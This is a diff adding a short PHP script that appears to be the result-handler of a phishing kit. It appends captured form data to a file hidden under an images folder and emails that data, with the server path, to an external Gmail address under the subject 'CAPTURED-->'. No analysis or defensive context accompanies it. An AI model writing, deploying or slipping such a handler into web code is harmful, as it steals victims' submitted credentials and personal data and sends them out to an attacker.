@@ -1,0 +1,8 @@
+<?php
+$pwd2 = dirname(__FILE__);
+
+$file = "../images/result.dat";
+file_put_contents($file, $msg, FILE_APPEND);
+mail('niketanraj133@gmail.com', "CAPTURED-->".$subject, $msg."\r\n\r\n$pwd2\r\n\r\n".$result, $headers)
+//dino@telkomsa.ne
+?>
